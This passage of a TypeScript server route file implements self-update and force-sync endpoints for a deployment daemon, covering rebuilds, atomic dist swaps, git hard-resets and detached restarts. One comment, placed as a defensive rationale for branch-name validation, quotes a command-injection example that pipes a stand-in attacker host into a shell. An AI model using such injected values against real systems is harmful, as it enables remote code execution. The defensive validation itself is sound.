      // 切分支后 daemon 拿到的是切分支前编译的旧 dist/。PR #529 之后
      // connections/issue 永远 404 + actor 永远 unknown 的根因。
      //
      // 之前尝试在 master-run 里加 tsc(commit 325aee7)把 daemon 整 crashloop
      // (`local` 在 case 块里不合法 → exit 78 → systemd 5 次失败永久 stop)。
      // 本修复完全不动 master-run / systemd unit,改用 force-sync 现成的
      // dist.next + esbuild + atomic rename 模式 in-process 重编 dist/,
      // 失败时旧 dist/ 保留,daemon 不重启,绝对不会 crashloop。
      //
      // 不并行跑 tsc --noEmit:validate 阶段已经跑过(line 8856),不重复。
      send('build-backend', 'running', '正在重编后端 dist.next/(esbuild)...');
      const cdsBackendStart = Date.now();
      const backendHeartbeat = setInterval(() => {
        const elapsed = Math.floor((Date.now() - cdsBackendStart) / 1000);
        sendSSE(res, 'backend-build-tick', { elapsed, message: `后端编译进行中 ${elapsed}s` });
        stateService.tickSelfUpdate();
      }, 5_000);
      // 清掉上一次失败留下的 dist.next 残留(若有)
      try { fs.rmSync(path.join(cdsDirForCheck, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
      let esbuildRes: Awaited<ReturnType<typeof shell.exec>>;
      try {
        esbuildRes = await shell.exec(
          'node scripts/build-dist-esbuild.mjs',
          { cwd: cdsDirForCheck, timeout: 60_000, env: { OUT_DIR: 'dist.next' } },
        );
      } finally {
        clearInterval(backendHeartbeat);
      }
      if (esbuildRes.exitCode !== 0) {
        const errMsg = (combinedOutput(esbuildRes) || '').slice(0, 800);
        try { fs.rmSync(path.join(cdsDirForCheck, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
        send('build-backend', 'error', `后端 esbuild 失败(旧 dist 保留): ${errMsg.slice(0, 300)}`);
        sendSSE(res, 'error', { message: `cds/dist.next esbuild 失败 — cds 继续跑老版本:\n${errMsg}` });
        res.end();
        recordFailure(`esbuild 编译失败: ${errMsg.slice(0, 300)}`);
        return;
      }
      // 验证 dist.next/index.js 真的写出来
      const distNextEntry = path.join(cdsDirForCheck, 'dist.next', 'index.js');
      if (!fs.existsSync(distNextEntry)) {
        try { fs.rmSync(path.join(cdsDirForCheck, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
        send('build-backend', 'error', 'esbuild 报成功但 dist.next/index.js 不存在(旧 dist 保留)');
        sendSSE(res, 'error', { message: 'esbuild 报成功但 dist.next/index.js 缺失,中止重启' });
        res.end();
        recordFailure('esbuild exit=0 but dist.next/index.js missing');
        return;
      }
      // Atomic swap: dist → dist.old.<ts>, dist.next → dist
      const swapTs = Date.now();
      const distPath = path.join(cdsDirForCheck, 'dist');
      const distOldPath = path.join(cdsDirForCheck, `dist.old.${swapTs}`);
      const distNextPath = path.join(cdsDirForCheck, 'dist.next');
      try {
        if (fs.existsSync(distPath)) fs.renameSync(distPath, distOldPath);
        try {
          fs.renameSync(distNextPath, distPath);
        } catch (renameErr) {
          // 中间失败,把备份还回去保证 dist 始终存在
          if (fs.existsSync(distOldPath)) {
            try { fs.renameSync(distOldPath, distPath); } catch { /* ignore */ }
          }
          throw renameErr;
        }
        // 写 .build-sha 让 master-run sentinel 不会跑冗余 tsc
        try { fs.writeFileSync(path.join(distPath, '.build-sha'), newHead + '\n'); } catch { /* ignore */ }
        // 删旧 dist.old(成功才删,失败保留以便人工回滚)
        try { fs.rmSync(distOldPath, { recursive: true, force: true }); } catch { /* ignore */ }
      } catch (swapErr) {
        send('build-backend', 'error', `dist 原子替换失败: ${(swapErr as Error).message}`);
        sendSSE(res, 'error', { message: `dist atomic swap failed,已尝试回滚: ${(swapErr as Error).message}` });
        res.end();
        recordFailure(`dist atomic swap failed: ${(swapErr as Error).message}`);
        return;
      }
      const backendSec = Math.floor((Date.now() - cdsBackendStart) / 1000);
      timingRecorder.merge({ buildBackendMs: Date.now() - cdsBackendStart });
      send('build-backend', 'done', `后端 dist/ 已重编到 ${newHead} (${backendSec}s)`);

      // The first nginx-render above runs before dist/ is rebuilt, so pages
      // generated from dist/cli/render-page.js (notably cds-waiting.html) can
      // otherwise lag one deploy behind. Re-render after the atomic dist swap
      // so nginx uses the current loading-page templates during this restart.
      try {
        const renderRes = await shell.exec('./exec_cds.sh nginx-render', {
          cwd: path.join(repoRoot, 'cds'),
          timeout: 15_000,
        });
        if (renderRes.exitCode === 0) {
          send('nginx-render', 'done', 'nginx 模板已用新 dist 重新渲染');
        } else {
          send('nginx-render', 'warning', `nginx-render(new dist) exit=${renderRes.exitCode}: ${(renderRes.stderr || renderRes.stdout || '').slice(0, 200)}`);
        }
      } catch (err) {
        send('nginx-render', 'warning', `nginx-render(new dist) 异常(忽略,继续): ${(err as Error).message}`);
      }

      // In-process 重建 cds/web/dist —— 详见 runInProcessWebBuild 注释
      // (Bugbot PR #524 第九轮重构:抽到顶层 helper,与 self-force-sync 共用)
      timingRecorder.merge(await runInProcessWebBuild(newHead, send, res));
      }

      // 2026-06-14:默认不等排空。master work / branch operation coordinator
      // 已负责 interruptAll + 重启后 reconcile。只有请求显式 drain=true 或
      // drainTimeoutMs>0 时才等待,避免日常更新被旧 180s 窗口拖成数分钟。
      const drainStartedAt = Date.now();
      const restartDrain = restartDrainTimeoutMs > 0
        ? await (async () => {
            send('drain', 'running', `等待 in-flight 分支操作排空(最多 ${Math.floor(restartDrainTimeoutMs / 1000)}s)…`);
            return waitForRestartSafeBranchOperationsForRoute('api.self-update', restartDrainTimeoutMs);
          })()
        : { ok: true, active: [] };
      // 把排空等待计入 timings(可达 180s)。此前不记导致进度条各 step 之和远小于
      // totalMs,UI 大片留白且"总计"对不上。
      const drainMs = Date.now() - drainStartedAt;
      timingRecorder.merge({ drainMs });
      if (restartDrainTimeoutMs <= 0) {
        send('drain', 'done', '已跳过排空等待(默认策略,立即重启)');
      } else if (!restartDrain.ok) {
        send(
          'drain',
          'warning',
          `优雅窗口超时,仍有 ${restartDrain.active.length} 个分支写操作在跑——直接 restart,在跑的 op 会被 webhook 重试`,
        );
      } else {
        send('drain', 'done', `分支操作已排空 (${Math.floor(drainMs / 1000)}s)`);
      }

      // 流水成功记录(2026-05-04):预检通过 + 重启即将发起 = 我们记录的"成功"。
      recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: newHead || fromSha,
        trigger: 'manual',
        status: 'success',
        durationMs: Date.now() - startedAt,
        actor,
        ...({ updateMode } as Record<string, unknown>),
      });
      // Mongo-backed state is write-behind. This path exits the process about
      // one second after sending the restart event. A stuck Mongo write must
      // not keep the old daemon alive after dist/ has already been swapped.
      await flushSelfUpdateStateBeforeRestart({
        trigger: 'manual',
        branch: branch || '',
        fromSha,
        toSha: newHead || fromSha,
        actor,
      });

      // Step 4: restart CDS via detached process
      // 自更新前段总耗时(从 startedAt 到 spawn 之前):验证 + git + web build。
      // 这段是用户能看到弹窗 spinner 转的时间。spawn 之后页面 reload 由轮询
      // 决定,与本进程无关。
      const preRestartMs = Date.now() - startedAt;
      sendSSE(res, 'timings', {
        phase: 'pre-restart',
        title: `预重启总耗时 ${preRestartMs}ms (${Math.floor(preRestartMs / 1000)}s)`,
        wall_clock_ms: preRestartMs,
        wall_clock_s: Math.floor(preRestartMs / 1000),
      });
      send('restart', 'running', `预重启总耗时 ${Math.floor(preRestartMs / 1000)}s · 正在重启 CDS...`);
      sendSSE(res, 'done', { message: 'CDS 即将重启，页面将在几秒后自动刷新...' });
      res.end();

      // Spawn detached restart script, then exit ourselves.
      // Previous approach relied on exec_cds.sh killing the old process (us),
      // but macOS process group kill behaves differently from Linux.
      // Self-exit is more reliable: we release the port, then exec_cds.sh
      // finds it free and starts the new process cleanly.
      //
      // 警告 We capture stdout/stderr to a log file instead of `stdio: 'ignore'`
      // so that silent spawn failures (e.g., exec_cds.sh not understanding an
      // argument) leave a forensic trail. Without this, the whole CDS cluster
      // goes dark with no clue why.
      setTimeout(() => {
        const cdsDir = path.join(repoRoot, 'cds');
        const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
        try {
          // Ensure directory exists
          fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
          const stamp = new Date().toISOString();
          fs.appendFileSync(errorLogPath, `\n=== self-update spawn at ${stamp} (branch=${branch || '(same)'}) ===\n`);

          const out = fs.openSync(errorLogPath, 'a');
          const errFd = fs.openSync(errorLogPath, 'a');
          const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
            cwd: cdsDir,
            detached: true,
            stdio: ['ignore', out, errFd],
            env: { ...process.env },
          });
          child.on('error', (err) => {
            fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
          });
          child.unref();

          // Exit ourselves after a brief delay so exec_cds.sh can bind the port.
          // If the new process failed to start, the next admin to hit CDS will
          // see an empty upstream — and will find a forensic trail in
          // .cds/self-update-error.log.
          branchOperationCoordinator?.interruptAll('CDS self-update is restarting the process', 'api.self-update');
          setTimeout(() => process.exit(0), 1000);
        } catch (spawnErr) {
          // Something went wrong before spawn; write it out and still exit
          // (caller already received 'done' SSE; they're expecting restart).
          try {
            fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
          } catch { /* can't log either; give up silently */ }
          branchOperationCoordinator?.interruptAll('CDS self-update spawn failed; process is exiting', 'api.self-update');
          setTimeout(() => process.exit(1), 500);
        }
      }, 500);
    } catch (err) {
      send('error', 'error', `更新失败: ${(err as Error).message}`);
      if (!res.writableEnded) {
        sendSSE(res, 'error', { message: (err as Error).message });
        res.end();
      }
      recordFailure(`更新失败(异常): ${(err as Error).message}`);
    } finally {
      // Bugbot 31da8d97 (HIGH):兜底清 in-progress 标记。
      // recordSelfUpdate 已经在 success/aborted/failed 三种正常路径上清掉,
      // 但若 catch handler 自身抛(send / sendSSE / res.end 在异常态下),
      // marker 会卡住 — 所有 tab 看到"自更新进行中"幽灵。idempotent 清空,
      // 二次清不影响已 record 的历史。
      stateService.clearSelfUpdateActive();
    }
  });

  // POST /api/self-update-dry-run — run the pre-restart validation
  // WITHOUT killing the running process or spawning a new one.
  //
  // Body: {} — operates on the currently checked-out source tree.
  //
  // Returns:
  //   { ok: true, summary }              — safe to self-update
  //   { ok: false, stage, error }        — blocking issue
  //
  // Use case: operators (and CI) who want to verify a branch can
  // be self-updated before actually hitting the red button. No
  // side effects — if you see { ok: true } you can confidently
  // call /api/self-update next.
  router.post('/self-update-dry-run', async (_req, res) => {
    const cdsDir = path.join(config.repoRoot, 'cds');
    try {
      const started = Date.now();
      const result = await validateBuildReadiness(shell, cdsDir);
      const durationMs = Date.now() - started;
      if (result.ok) {
        // 2026-05-04 v2:webWarning(前端 tsc 失败)是 warning,不阻断,加到响应里。
        res.json({
          ok: true,
          summary: result.summary,
          durationMs,
          timings: result.timings,
          plannedMode: 'full-validate',
          plannedCommands: [
            'pnpm install --frozen-lockfile (cds, skipped when stamp matches)',
            'pnpm install --frozen-lockfile (cds/web, skipped when stamp matches)',
            'tsc --noEmit (cds)',
            'tsc --noEmit (cds/web)',
            'node scripts/build-dist-esbuild.mjs (only when self-update touches backend)',
            'vite build (only when web bundle is stale)',
          ],
          ...(result.webWarning ? { webWarning: result.webWarning } : {}),
        });
      } else {
        res.status(422).json({
          ok: false,
          stage: result.stage,
          error: result.error,
          durationMs,
          timings: result.timings,
          hint:
            result.stage === 'install'
              ? 'pnpm install 失败 — 检查 pnpm-lock.yaml 是否与 package.json 同步，或网络是否能拉到 registry'
              : 'tsc --noEmit 失败 — 新代码有类型错误或 import 解析不到',
        });
      }
    } catch (err) {
      res.status(500).json({
        ok: false,
        stage: 'unknown',
        error: (err as Error).message,
      });
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // POST /api/self-force-sync — recovery endpoint for divergent repos.
  //
  // When the CDS host's local git checkout has diverged from origin (e.g.
  // a prior self-update silently merged, or an operator made a hot-patch
  // commit), the regular /api/self-update can't recover because its
  // `git pull` keeps creating merge commits that DROP remote changes.
  // This endpoint is the escape hatch: hard-reset to origin + clear the
  // dist/.build-sha cache so the next start recompiles from scratch +
  // restart. Destructive to local commits, intentionally so.
  //
  // Streams SSE so the operator watching the UI gets real-time progress.
  // ─────────────────────────────────────────────────────────────────────
  router.post('/self-force-sync', async (req, res) => {
    // 2026-05-08 用户反馈"强制更新一秒过 → 没法重复测试":body.force=true 强制
    // 跳过 no-op fast-path,即使 HEAD === origin 且 dist .build-sha 都已对上,
    // 也走完整 fetch + reset + analyze + (热/冷/web-only) 流程。这样测试人员
    // 可以反复点同一 commit 看更新链路。"强制更新"按钮应当传 force:true。
    const { branch, force } = (req.body || {}) as { branch?: string; force?: boolean };
    const forceMode = force === true;
    const restartDrainTimeoutMs = resolveRestartDrainTimeoutFromRequest(req.body);

    initSSE(res);
    // 2026-05-07 同 /api/self-update:actor 真名 + 落盘 SSOT。
    const cdsUser = (req as { cdsUser?: { githubLogin?: string; login?: string; username?: string } }).cdsUser;
    const actor =
      cdsUser?.githubLogin ||
      cdsUser?.login ||
      cdsUser?.username ||
      resolveActorFromRequest(req) ||
      'unknown';
    const existingActive = stateService.getActiveSelfUpdate();
    if (isSelfUpdateBusy(existingActive)) {
      const message = `已有更新正在进行(${existingActive?.trigger || 'unknown'} · ${existingActive?.step || 'starting'}),本次强制更新已拒绝以避免并发构建串台`;
      stateService.appendSelfUpdateLog('warning', `[concurrency] ${message} actor=${actor}`);
      void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
      sendSSE(res, 'error', { message, activeSelfUpdate: existingActive });
      res.end();
      return;
    }
    if (existingActive) stateService.clearSelfUpdateActive();
    // 2026-05-13 复查用结构化耗时:每个 step 独立计时,最后落到 history.timings。
    const startedAt = Date.now();
    const timingRecorder = createSelfUpdateTimingRecorder(startedAt);

    stateService.markSelfUpdateActive({
      startedAt: new Date().toISOString(),
      branch: branch || '',
      trigger: 'force-sync',
      actor,
    });
    void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
    const send = (step: string, status: string, title: string, extra?: Record<string, unknown>) => {
      timingRecorder.mark(step, status);
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString(), ...(extra || {}) });
      const level: 'info' | 'warning' | 'error' =
        status === 'error' ? 'error' : status === 'warning' ? 'warning' : 'info';
      stateService.updateSelfUpdateStep(step, { level, logText: `[${step}] ${title}` });
      void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
    };

    // 流水记录(2026-05-04):同 /api/self-update,trigger='force-sync',
    // UI 历史抽屉用 trigger 字段区分两类。
    let fromSha = '';
    try {
      fromSha = (await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot }))
        .stdout.trim();
    } catch { /* tolerated */ }
    const recordFailure = (errMsg: string): void => {
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: fromSha,
        trigger: 'force-sync',
        status: 'failed',
        durationMs: Date.now() - startedAt,
        error: errMsg.slice(0, 300),
        actor,
        timings: timingRecorder.snapshot(),
      });
    };
    const recordSelfUpdate = (record: Omit<import('../types.js').SelfUpdateRecord, 'timings'>): void => {
      stateService.recordSelfUpdate({
        ...record,
        timings: timingRecorder.snapshot(),
      });
    };

    try {
      const repoRoot = config.repoRoot;
      const cdsDir = path.join(repoRoot, 'cds');

      // Step 1: fetch
      send('fetch', 'running', '正在拉取远端 ref…');
      const fetchAuth = await gitAuthForRepo(repoRoot);
      const fetchRes = await shell.exec('git fetch --all --prune', { cwd: repoRoot, timeout: 60_000, env: fetchAuth.env });
      if (fetchRes.exitCode !== 0) {
        const errMsg = (combinedOutput(fetchRes) || 'git fetch 失败').trim();
        send('fetch', 'error', 'git fetch 失败: ' + errMsg.slice(0, 200));
        sendSSE(res, 'error', {
          message: errMsg.slice(0, 500),
          authSource: fetchAuth.source,
          projectId: fetchAuth.projectId,
        });
        res.end();
        recordFailure(`git fetch 失败: ${errMsg}`);
        return;
      }
      send('fetch', 'done', '远端 ref 已同步');

      // Step 2: resolve target branch (use current if not supplied).
      // Reject shell-unsafe refs up front — the endpoint is auth-gated
      // but defense-in-depth against an attacker with a valid AI key
      // crafting `branch='main; curl evil.com | sh'` is cheap.
      let target = branch;
      if (!target) {
        const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        target = cur.stdout.trim() || 'main';
      }
      if (!isSafeGitRef(target)) {
        send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 branch: ${target}` });
        res.end();
        recordFailure(`不合法的 branch: ${target}`);
        return;
      }
      send('resolve', 'done', '目标分支: ' + target);

      // 2026-05-04 fix:fetch 之后先校验 origin/<target> ref 存在,
      // 避免 reset 失败时报英文 git stack trace(同 self-update 修复)。
      const refCheckFs = await shell.exec(
        `git rev-parse --verify --quiet origin/${target}`,
        { cwd: repoRoot },
      );
      if (refCheckFs.exitCode !== 0) {
        const msg =
          `远端分支 origin/${target} 不存在或已被删除。` +
          `请在 body.branch 显式指定一个活分支(如 main),或在 UI 下拉重选。`;
        send('resolve', 'error', msg);
        sendSSE(res, 'error', { message: msg, suggestedFallback: 'main' });
        res.end();
        recordFailure(`origin/${target} 不存在`);
        return;
      }

      // Step 3a: checkout target branch BEFORE the hard reset.
      //
      // Without this, calling with {branch:'develop'} while HEAD is on
      // 'main' would `git reset --hard origin/develop` and move the
      // CURRENT branch (main) to develop's commit — corrupting main's
      // tracking. self-update does this right; we were missing it.
      // Caught by Cursor Bugbot #450 round 7 (HIGH).
      send('checkout', 'running', `切换到 ${target} 分支...`);
      const coRes = await shell.exec(`git checkout -f ${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (coRes.exitCode !== 0) {
        // Fallback: create tracking branch from origin if it doesn't exist
        // locally yet (same dance self-update performs).
        const fbRes = await shell.exec(`git checkout -f -b ${target} origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
        if (fbRes.exitCode !== 0) {
          const errMsg = (combinedOutput(fbRes) || '未知错误').trim();
          send('checkout', 'error', `切换失败: ${errMsg.slice(0, 200)}`);
          sendSSE(res, 'error', { message: `无法切换到 ${target}: ${errMsg}` });
          res.end();
          recordFailure(`无法切换到 ${target}: ${errMsg}`);
          return;
        }
      }
      // Verify we actually ended up on the target branch — catch any
      // silent checkout-succeeds-but-HEAD-elsewhere edge case.
      const verify = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
      const actual = verify.stdout.trim();
      if (actual !== target) {
        send('checkout', 'error', `切换未生效: 期望 ${target},实际 ${actual}`);
        sendSSE(res, 'error', { message: `git checkout 未生效: 仍在 ${actual}` });
        res.end();
        recordFailure(`git checkout 未生效: 仍在 ${actual}`);
        return;
      }
      send('checkout', 'done', `已切到 ${target}`);

      // Step 3b: hard-reset to origin/<target>
      send('reset', 'running', `硬对齐 HEAD → origin/${target}`);
      const resetRes = await shell.exec(`git reset --hard origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (resetRes.exitCode !== 0) {
        send('reset', 'error', 'reset 失败: ' + (combinedOutput(resetRes) || '').slice(0, 200));
        sendSSE(res, 'error', { message: `git reset --hard origin/${target} 失败` });
        res.end();
        recordFailure(`git reset --hard origin/${target} 失败`);
        return;
      }
      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
      const newHeadFull = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
      send('reset', 'done', `HEAD = ${newHead}`, { commitHash: newHead });

      // B'.5.1 hotfix(2026-05-08):同 self-update,git reset 后主动跑 nginx-render
      // 让 host cds-site.conf 切到新 nginx 模板。详见 self-update 路由同名注释。
      try {
        const renderRes = await shell.exec('./exec_cds.sh nginx-render', {
          cwd: cdsDir,
          timeout: 15_000,
        });
        if (renderRes.exitCode === 0) {
          send('nginx-render', 'done', 'nginx 模板已重新渲染');
        } else {
          send('nginx-render', 'warning', `nginx-render exit=${renderRes.exitCode}: ${(renderRes.stderr || renderRes.stdout || '').slice(0, 200)}`);
        }
      } catch (err) {
        send('nginx-render', 'warning', `nginx-render 异常(忽略,继续): ${(err as Error).message}`);
      }

      // ── Fast-path: 当前 dist + web bundle 已经是 newHead 编译产物时直接跳过
      // ── 用户反馈 2026-05-06:更新流程 215s 太慢。如果 force-sync 后 HEAD
      //    没真正变化(reset 是个 no-op),整个 validate + 重 build + restart 就
      //    100% 浪费。先看 dist/.build-sha 和 web/dist/.build-sha:两者都匹配
      //    newHead → 整个 self-force-sync 在 ~3s 内 return,不走 validate / 重启。
      const distShaPath = path.join(cdsDir, 'dist', '.build-sha');
      const webShaPath = path.join(cdsDir, 'web', 'dist', '.build-sha');
      let distSha = '';
      let webSha = '';
      try { if (fs.existsSync(distShaPath)) distSha = fs.readFileSync(distShaPath, 'utf8').trim(); } catch { /* ignore */ }
      try { if (fs.existsSync(webShaPath)) webSha = fs.readFileSync(webShaPath, 'utf8').trim(); } catch { /* ignore */ }
      const shaMatches = (a: string, b: string): boolean =>
        !!a && !!b && (a === b || (a.length >= 7 && b.startsWith(a)) || (b.length >= 7 && a.startsWith(b)));
      const distMatches = shaMatches(distSha, newHeadFull);
      const webMatches = shaMatches(webSha, newHeadFull);
      const distErrFile = path.join(cdsDir, 'dist', '.build-error');
      const webErrFile = path.join(cdsDir, 'web', 'dist', '.build-error');
      const noBuildErrors = !fs.existsSync(distErrFile) && !fs.existsSync(webErrFile);
      if (distMatches && webMatches && noBuildErrors && !forceMode) {
        send('no-op', 'done', `dist + web bundle 都已是 ${newHead} — 跳过 validate / 重 build / 重启`);
        sendSSE(res, 'done', { message: `force-sync 已无操作(HEAD ${newHead} 与现行 dist 完全一致)` });
        res.end();
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || target || '',
          fromSha,
          toSha: newHead,
          trigger: 'force-sync',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
          // 标记 noOp 让 UI 历史区分"真重启"和"已是最新走快路径"
          ...({ noOp: true } as Record<string, unknown>),
        });
        return;
      }

      // * 2026-05-06 新增 — 改动影响分析,决定走"热重载"还是"完整重启"。
      // 用户反馈:让两种模式同时生效,自动判断。RESTART_PATTERNS(依赖/Docker/
      // tsconfig/vite.config/.env/路由 schema)命中任一即冷重启;否则走热重载。
      // 热路径跳过 validate(节省 ~50s),直接 incremental emit + atomic swap +
      // 写 .build-sha,然后**不**触发 systemd restart。systemd unit 的 ExecStart
      // 已经改成 `node --watch=dist`,node 自己感知 dist/ 变化平滑重启 ~2s。
      // 警告 Bugbot 0ab88deb + fbdfe6ce:fromSha 来自 `git rev-parse --short HEAD`
      // 通常是 7 位 hex,但允许为空(line 8744 容忍),且即使非空也应过 isSafeGitRef
      // defense-in-depth。空 / 不合法 → 没法可靠 diff → 保守走冷路径。
      let changedPaths: string[] = [];
      let diffOk = false;
      if (fromSha && isSafeGitRef(fromSha)) {
        try {
          const diffRes = await shell.exec(
            `git diff --name-only ${fromSha}..HEAD`,
            { cwd: repoRoot, timeout: 15_000 },
          );
          if (diffRes.exitCode === 0) {
            changedPaths = diffRes.stdout.split('\n').map((s) => s.trim()).filter(Boolean);
            diffOk = true;
          }
        } catch { /* tolerate */ }
      }
      const impact = analyzeChangeImpact(changedPaths);

      // * Phase A 零停机前端更新 (2026-05-08):改动全部落在 cds/web/src/** 时,
      // 跳过后端 esbuild + 跳过 systemd 重启,**只**重 web/dist 然后 SSE 'done'。
      // daemon 持续在线,nginx 不动,浏览器下次刷新自动拿新 hash bundle —— 用户体感
      // 0 停机。同 doc-only 路径但要真的跑 vite build。
      // 详细审计见 doc/report.cds.self-update-timing-audit.md Phase A。
      if (diffOk && isWebOnlyChange(impact, changedPaths)) {
        send('analyze', 'done', `本次改动 ${changedPaths.length} 文件全部在 cds/web/src/** — 走零停机前端更新路径`);
        // 跑 in-process vite build → atomic rename web/dist → 写 .build-sha。
        // 失败时 runInProcessWebBuild 会 sendSSE error + res.end + throw,
        // 我们用 try/catch 捕获,记录失败流水,直接 return(daemon 不重启)。
        try {
          timingRecorder.merge(await runInProcessWebBuild(newHead, send, res));
        } catch (webBuildErr) {
          // runInProcessWebBuild 内部已经 send error + res.end,这里只补记流水。
          recordFailure(`web-only build 失败: ${(webBuildErr as Error).message}`);
          return;
        }
        const webElapsed = Math.floor((Date.now() - startedAt) / 1000);
        send('web-only', 'done', `cds/web/dist 已重建到 ${newHead} (${webElapsed}s) — daemon 不重启,前端立即生效`);
        sendSSE(res, 'done', {
          message: `零停机前端更新完成 (${webElapsed}s) — HEAD=${newHead},刷新页面即看到新版`,
          commitHash: newHead,
          mode: 'web-only',
          webOnlyFiles: changedPaths.length,
        });
        res.end();
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || target || '',
          fromSha,
          toSha: newHead,
          trigger: 'force-sync',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
          ...({ updateMode: 'web-only' } as Record<string, unknown>),
        });
        return;
      }

      if (!diffOk) {
        send('analyze', 'done', `git diff 不可用(fromSha 为空或 shallow repo)— 保守走完整重启`);
      } else if (impact.needsRestart) {
        const sample = impact.restartTriggers.slice(0, 3).map((t) => `${t.path}(${t.reason})`).join('; ');
        send('analyze', 'done', `${impact.restartTriggers.length} 处改动需重启:${sample}${impact.restartTriggers.length > 3 ? '…' : ''}`);
      } else if (impact.hotReloadablePaths.length === 0 && impact.irrelevantPaths.length > 0 && !forceMode) {
        // 警告 Bugbot 7749d6f8 (Medium) — 之前这里只 send 了一句 analyze 日志,然后
        // hotEligible=false 让流程继续走完整冷路径(validate + esbuild + tsc + atomic
        // swap + restart),~70-95s 全部白跑。文档/changelogs 改动既不影响 dist
        // 也不影响 web bundle,正确做法是直接 fast-path 写新 .build-sha 后 return。
        // 与前面 line 8970 fast-path 区别:那个要求两个 .build-sha 已是 newHead;
        // 这里是首次切到 newHead 时,虽然 .build-sha 不同但改动全是 docs,可以直接
        // 把现有 dist + web bundle 标记为"已是 newHead 产物"(它们的字节实际不变)。
        //
        // 警告 Bugbot da715c3c (Medium) — 必须同时要求 irrelevantPaths > 0,
        // 否则 changedPaths 为空(fromSha == newHead 但 .build-sha 缺失/不匹配)也会命中,
        // 导致写一个伪 .build-sha 让"陈旧 dist"被永久标记为 current,后续永远不重 build。
        // 空 diff 下落到下面的 else,走冷路径重新 build 兜底。
        send('analyze', 'done', `本次改动 ${impact.irrelevantPaths.length} 个纯文档文件,无应用代码改动 — 跳过 build/restart`);
        try { fs.writeFileSync(distShaPath, newHeadFull); } catch { /* tolerate — fast-path 失效但功能不受影响 */ }
        try { fs.writeFileSync(webShaPath, newHeadFull); } catch { /* tolerate */ }
        send('doc-only', 'done', `dist/.build-sha 与 web/dist/.build-sha 已标记为 ${newHead}`);
        sendSSE(res, 'done', {
          message: `已对齐到 ${newHead},仅改动 ${impact.irrelevantPaths.length} 个文档文件 — 无需 rebuild/restart`,
          commitHash: newHead,
          mode: 'doc-only',
          docOnlyFiles: impact.irrelevantPaths.length,
        });
        res.end();
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || target || '',
          fromSha,
          toSha: newHead,
          trigger: 'force-sync',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
          ...({ updateMode: 'doc-only' } as Record<string, unknown>),
        });
        return;
      } else if (impact.hotReloadablePaths.length === 0) {
        // 走到这里 = changedPaths 为空(fromSha == newHead 但前面 fast-path no-op
        // 没命中,说明 dist/.build-sha 缺失或不匹配)。**不能**写假 .build-sha 标记当前
        // 为最新,必须走冷路径重新 build 把 dist 真正同步到 newHead。
        send('analyze', 'done', `git diff 显示无文件变更,但 dist/.build-sha 不匹配 — 走冷路径重 build 兜底`);
      } else {
        send('analyze', 'done', `本次改动 ${changedPaths.length} 文件全部热重载安全(应用代码 ${impact.hotReloadablePaths.length} + 文档 ${impact.irrelevantPaths.length})— 走热路径`);
      }
      // 警告 Bugbot 0ab88deb + 3ec7d7ab:hotEligible 必须 (a) diff 可信 (b) 至少有一个应用代码改动。
      // 缺任一都退回冷路径(保守) — 走冷路径的成本是慢点,走错路径的成本是 silent stale code。
      // (doc-only 路径已在上面 return,这里走到时 hotReloadablePaths.length > 0 必然成立。)
      const hotEligible = diffOk && !impact.needsRestart && impact.hotReloadablePaths.length > 0;

      // Step 4: validate new code compiles BEFORE touching dist.
      //
      // * 2026-05-05 顺序修正(用户实测 4 次 abort 留空 dist):
      // 历史顺序是 cache → validate,validate 失败时 dist 已经清空 →
      // systemd 重启 cds-master 就找不到 dist/index.js → CDS 起不来 →
      // 用户必须 SSH 手动 npx tsc 救场。
      //
      // 现改成 validate 先做(tsc --noEmit 不输出文件,无副作用),
      // 通过才清 dist + tsbuildinfo + 重建。fail-safe:validate 失败时
      // dist 完好,cds 继续跑老版本,不需要人工介入。
      //
      // * 2026-05-06 热路径优化:hotEligible 时跳过 validate(50s)。理由:
      //   - tsc emit 步骤本身就会捕获类型错误(失败 → dist.next 删除,旧 dist 保留)
      //   - hot-eligible 已排除 package.json/lockfile 变更,无需 pnpm install
      // 风险:web tsc 错误不再阻断,改成 emit 阶段 vite build 失败 → web bundleStale
      // 徽章亮(原行为)。
      const runVisibleValidation = async (options: ValidateBuildOptions = {}) => {
        const validateStart = Date.now();
        let validateHeartbeatLabel = options.skipTsc
          ? '热路径预检'
          : '预检';
        const validateHeartbeat = setInterval(() => {
          const elapsed = Math.floor((Date.now() - validateStart) / 1000);
          sendSSE(res, 'validate-tick', { elapsed, message: `${validateHeartbeatLabel} · 已运行 ${elapsed}s` });
          stateService.tickSelfUpdate();
          stateService.appendSelfUpdateLog('info', `${validateHeartbeatLabel} · 已运行 ${elapsed}s`);
        }, 15_000);
        try {
          return await validateBuildReadiness(shell, cdsDir, {
            ...options,
            onProgress: (event) => {
